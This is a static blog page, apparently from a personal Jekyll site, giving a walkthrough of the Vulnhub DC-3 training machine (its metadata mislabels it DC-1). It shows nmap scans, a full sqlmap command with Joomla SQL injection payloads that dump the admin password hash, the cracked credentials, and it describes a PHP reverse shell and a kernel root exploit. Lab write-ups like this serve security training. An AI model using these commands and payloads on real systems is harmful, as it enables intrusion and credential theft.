@@ -1,0 +1,724 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.27.1 by Michael Rose
+  Copyright 2013-2025 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Vulnhub DC-3 Walkthrough | Raju Talukder</title>
+<meta name="description" content="Step-by-step walkthrough of the DC-1 machine from Vulnhub.">
+
+
+  <meta name="author" content="Raju Talukder">
+  
+  <meta property="article:author" content="Raju Talukder">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Raju Talukder">
+<meta property="og:title" content="Vulnhub DC-3 Walkthrough">
+<meta property="og:url" content="http://localhost:4000/dc-series/Vulnhub-dc-3-walkthrough/">
+
+
+  <meta property="og:description" content="Step-by-step walkthrough of the DC-1 machine from Vulnhub.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/dc-1/cover.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-10-20T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/dc-series/Vulnhub-dc-3-walkthrough/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+  
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Raju Talukder
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/"
+                
+                
+              >Home</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/blogs/"
+                
+                
+              >Blog</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('/assets/images/dc-1/cover.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          Vulnhub DC-3 Walkthrough
+
+        
+      </h1>
+      
+        <p class="page__lead">Step-by-step walkthrough of the DC-1 machine from Vulnhub.
+</p>
+      
+      
+
+
+      
+    </div>
+  
+  
+    <span class="page__hero-caption">DC-1 Vulnhub Walkthrough
+</span>
+  
+</div>
+
+
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/images/author/avatar.jpeg" alt="Raju Talukder" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Raju Talukder</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Cybersecurity Engineer, Red &amp; Blue Team Specialist</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Dhaka, Bangladesh</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="mailto:rajutalukder70@mail.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://x.com/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-brands fa-x-twitter" aria-hidden="true"></i><span class="label">X</span></a></li>
+          
+        
+          
+            <li><a href="https://facebook.com/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i><span class="label">Facebook</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/Raju-Talukder" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://instagram.com/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Vulnhub DC-3 Walkthrough">
+    <meta itemprop="description" content="Step-by-step walkthrough of the DC-1 machine from Vulnhub.">
+    <meta itemprop="datePublished" content="2023-10-20T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#information-gathering">Information Gathering</a></li><li><a href="#initial-foothold">Initial Foothold</a></li><li><a href="#post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</a></li></ul>
+            </nav>
+          </aside>
+        
+        <p>This box is really easy, relying entirely on reconnaissance skills. For the initial foothold, we need to identify the CMS and its version. Once the CMS version is identified, there is a known SQL injection vulnerability that leads to obtaining the admin user’s password hash. After decrypting the password, we can log in to the application. A theme allows the execution of PHP code, leading to the initial foothold. The kernel is quite old, and there is a publicly available exploit that grants root access.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Home
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: Joomla! - Open Source Content Management
+</code></pre></div></div>
+
+<p>From the nmap output we found only one http service is accessible publicly and the banner tells us it’s a ubuntu machine. The application is generated by joomla Open source content management system. Lets inspect the application manually.</p>
+
+<p><strong>Manual Inspection</strong></p>
+
+<p><img src="/assets/images/dc-3/10.png" alt="" /></p>
+
+<p>There isn’t much available. Since it’s a Joomla application, I’d like to run another nmap for vulnerability scanning.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p80</span> <span class="nt">--script</span> vuln 10.10.10.6
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http
+|_http-dombased-xss: Couldn<span class="s1">'t find any DOM based XSS.
+|_http-stored-xss: Couldn'</span>t find any stored XSS vulnerabilities.
+| http-internal-ip-disclosure: 
+|_  Internal IP Leaked: 127.0.1.1
+| http-csrf: 
+| Spidering limited to: <span class="nv">maxdepth</span><span class="o">=</span>3<span class="p">;</span> <span class="nv">maxpagecount</span><span class="o">=</span>20<span class="p">;</span> <span class="nv">withinhost</span><span class="o">=</span>10.10.10.6
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.10.6:80/
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>reset&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: user-registration
+|     Form action: /index.php/component/users/?task<span class="o">=</span>reset.request&amp;Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>reset&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php/component/users/?Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>remind&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: user-registration
+|     Form action: /index.php/component/users/?task<span class="o">=</span>remind.remind&amp;Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?view<span class="o">=</span>remind&amp;amp<span class="p">;</span><span class="nv">Itemid</span><span class="o">=</span>101
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php/component/users/?Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/2-uncategorised/1-welcome
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php
+|     
+|     Path: http://10.10.10.6:80/index.php
+|     Form <span class="nb">id</span>: login-form
+|     Form action: /index.php
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?Itemid<span class="o">=</span>101
+|     Form <span class="nb">id</span>: username-lbl
+|     Form action: /index.php/component/users/?task<span class="o">=</span>user.login&amp;Itemid<span class="o">=</span>101
+|     
+|     Path: http://10.10.10.6:80/index.php/component/users/?Itemid<span class="o">=</span>101
+|     Form <span class="nb">id</span>: login-form
+|_    Form action: /index.php/component/users/?Itemid<span class="o">=</span>101
+| http-vuln-cve2017-8917: 
+|   VULNERABLE:
+|   Joomla! 3.7.0 <span class="s1">'com_fields'</span> SQL Injection Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-8917
+|     Risk <span class="nb">factor</span>: High  CVSSv3: 9.8 <span class="o">(</span>CRITICAL<span class="o">)</span> <span class="o">(</span>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<span class="o">)</span>
+|       An SQL injection vulnerability <span class="k">in </span>Joomla! 3.7.x before 3.7.1 allows attackers
+|       to execute aribitrary SQL commands via unspecified vectors.
+|       
+|     Disclosure <span class="nb">date</span>: 2017-05-17
+|     Extra information:
+|       User: root@localhost
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-8917
+|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server<span class="s1">'s resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+| http-enum: 
+|   /administrator/: Possible admin folder
+|   /administrator/index.php: Possible admin folder
+|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
+|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
+|   /htaccess.txt: Joomla!
+|   /README.txt: Interesting, a readme.
+|   /bin/: Potentially interesting folder
+|   /cache/: Potentially interesting folder
+|   /images/: Potentially interesting folder
+|   /includes/: Potentially interesting folder
+|   /libraries/: Potentially interesting folder
+|   /modules/: Potentially interesting folder
+|   /templates/: Potentially interesting folder
+|_  /tmp/: Potentially interesting folder
+</span></code></pre></div></div>
+
+<p>From the second Nmap output, we found the version of Joomla, and it’s vulnerable to SQL injection. Let’s search in searchsploit to see if there is any exploit available for this Joomla version.</p>
+
+<p><img src="/assets/images/dc-3/1.png" alt="" /></p>
+
+<p>Searchsploit also reveals that this Joomla version is vulnerable to SQL injection. Let’s fire up SQLmap to automate the SQLi exploitation process.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.6/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=update.xml"</span><span class="nt">-p</span> list[fullordering] <span class="nt">-D</span> joomladb <span class="nt">-T</span> <span class="s1">'#__users'</span> <span class="nt">-C</span> <span class="nb">id</span>,username,password <span class="nt">--dump</span><span class="k">**</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 02:20:00 /2021-05-29/
+
+<span class="o">[</span>02:20:01] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span> 
+<span class="o">[</span>02:20:01] <span class="o">[</span>INFO] testing connection to the target URL
+<span class="o">[</span>02:20:01] <span class="o">[</span>WARNING] the web server responded with an HTTP error code <span class="o">(</span>500<span class="o">)</span> which could interfere with the results of the tests
+you have not declared cookie<span class="o">(</span>s<span class="o">)</span>, <span class="k">while </span>server wants to <span class="nb">set </span>its own <span class="o">(</span><span class="s1">'460ada11b31d3c5e5ca6e58fd5d3de27=c58fg7qsgap...985gcqei64'</span><span class="o">)</span><span class="nb">.</span> Do you want to use those <span class="o">[</span>Y/n] y
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+<span class="nt">---</span>
+Parameter: list[fullordering] <span class="o">(</span>GET<span class="o">)</span>
+    Type: error-based
+    Title: MySQL <span class="o">&gt;=</span> 5.1 error-based - Parameter replace <span class="o">(</span>UPDATEXML<span class="o">)</span>
+    Payload: <span class="nv">option</span><span class="o">=</span>com_fields&amp;view<span class="o">=</span>fields&amp;layout<span class="o">=</span>modal&amp;list[fullordering]<span class="o">=(</span>UPDATEXML<span class="o">(</span>5655,CONCAT<span class="o">(</span>0x2e,0x7171716a71,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">5655</span><span class="o">=</span>5655,1<span class="o">)))</span>,0x71627a7a71<span class="o">)</span>,1990<span class="o">))</span>
+
+    Type: time-based blind
+    Title: MySQL <span class="o">&gt;=</span> 5.0.12 time-based blind - Parameter replace <span class="o">(</span>substraction<span class="o">)</span>
+    Payload: <span class="nv">option</span><span class="o">=</span>com_fields&amp;view<span class="o">=</span>fields&amp;layout<span class="o">=</span>modal&amp;list[fullordering]<span class="o">=(</span>SELECT 5736 FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>epcn<span class="o">)</span>
+<span class="nt">---</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL <span class="o">&gt;=</span> 5.1
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] fetching entries of column<span class="o">(</span>s<span class="o">)</span> <span class="s1">'`id`, `password`, username'</span> <span class="k">for </span>table <span class="s1">'#__users'</span> <span class="k">in </span>database <span class="s1">'joomladb'</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] retrieved: <span class="s1">'629'</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] retrieved: <span class="s1">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span>
+<span class="o">[</span>02:20:03] <span class="o">[</span>INFO] retrieved: <span class="s1">'admin'</span>
+Database: joomladb
+Table: <span class="c">#__users</span>
+<span class="o">[</span>1 entry]
++------+--------------------------------------------------------------+----------+
+| <span class="nb">id</span>   | password                                                     | username |
++------+--------------------------------------------------------------+----------+
+| 629  | <span class="k">**</span><span class="nv">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><span class="k">**</span> | admin    |
++------+--------------------------------------------------------------+----------+
+</code></pre></div></div>
+
+<p>Exploiting that SQL injection vulnerability with the help of SQLmap, we have successfully managed to obtain the admin user’s password hash. Now, we can use any hash-cracking tools, but for now, I will utilize the John the Ripper tool.</p>
+
+<p><img src="/assets/images/dc-3/2.png" alt="" /></p>
+
+<p>With the help of John, we successfully decrypted the hash and logged into the web application. I discovered two templates inside the template link.</p>
+
+<p><img src="/assets/images/dc-3/3.png" alt="" /></p>
+
+<p>After some exploration of the application’s admin dashboard, I found that the Beez3 template allows us to execute PHP code.</p>
+
+<p><img src="/assets/images/dc-3/4.png" alt="" /></p>
+
+<p>I edited the Beez3 template, specifically the index.php file, and added some reverse shell code.</p>
+
+<p><img src="/assets/images/dc-3/5.png" alt="" /></p>
+
+<p>After saving the file we can just click on Template Preview button to execute the code.</p>
+
+<p><strong>Creds</strong></p>
+
+<aside>
+💡 admin:snoopy
+
+</aside>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p><img src="/assets/images/dc-3/6.png" alt="" /></p>
+
+<p>After adding our reverse shell code to the index.php file, before executing the code, I started a netcat listener to catch the reverse shell. The reverse shell code worked fine, and we obtained the initial foothold.</p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p>After obtaining the shell, I explored the file system for any misconfigurations, extra privilege files, or user permissions. However, I did not find anything interesting. Then, I decided to try kernel exploits. Using ‘lsb_release -a,’ I discovered that this is a very old Ubuntu machine.</p>
+
+<p><img src="/assets/images/dc-3/7.png" alt="" /></p>
+
+<p>Searchsploit already have some kernel exploit available.</p>
+
+<p><img src="/assets/images/dc-3/8.png" alt="" /></p>
+
+<p>I just transfer the exploit into the victim machine and extract the zip file and run the exploit which gives me the root shell.</p>
+
+<p><img src="/assets/images/dc-3/9.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#dc-series" class="page__taxonomy-item p-category" rel="tag">DC-Series</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2023-10-20T00:00:00+05:30">October 20, 2023</time></p>
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/dc-series/vulnhub-DC-2-walkthrough/" class="pagination--pager" title="Vulnhub DC-2 Walkthrough">Previous</a>
+    
+    
+      <a href="/dc-series/vulnhub-dc-4-walkthrough/" class="pagination--pager" title="Vulnhub DC-4 Walkthrough">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+  
+        <!-- 
+
+<div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="mailto:rajutalukder70@mail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+        
+      
+        
+          <li><a href="https://x.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-brands fa-x-twitter" aria-hidden="true"></i> X</a></li>
+        
+      
+        
+          <li><a href="https://facebook.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i> Facebook</a></li>
+        
+      
+        
+          <li><a href="https://github.com/Raju-Talukder" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://instagram.com/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 <a href="http://localhost:4000">Raju Talukder</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> -->
+
+<div class="page__footer-follow text-center">
+  <ul class="social-icons d-inline-flex justify-content-center">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li class="mx-2">
+            <a href="mailto:rajutalukder70@mail.com" rel="nofollow noopener noreferrer">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+            </a>
+          </li>
+        
+      
+        
+          <li class="mx-2">
+            <a href="https://x.com/" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-brands fa-x-twitter" aria-hidden="true"></i> X
+            </a>
+          </li>
+        
+      
+        
+          <li class="mx-2">
+            <a href="https://facebook.com/" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i> Facebook
+            </a>
+          </li>
+        
+      
+        
+          <li class="mx-2">
+            <a href="https://github.com/Raju-Talukder" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+            </a>
+          </li>
+        
+      
+        
+          <li class="mx-2">
+            <a href="https://instagram.com/" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
+            </a>
+          </li>
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright text-center">
+  &copy; 2025 <a href="http://localhost:4000">Raju Talukder</a>.
+  Powered by
+  <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp;
+  <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.
+</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
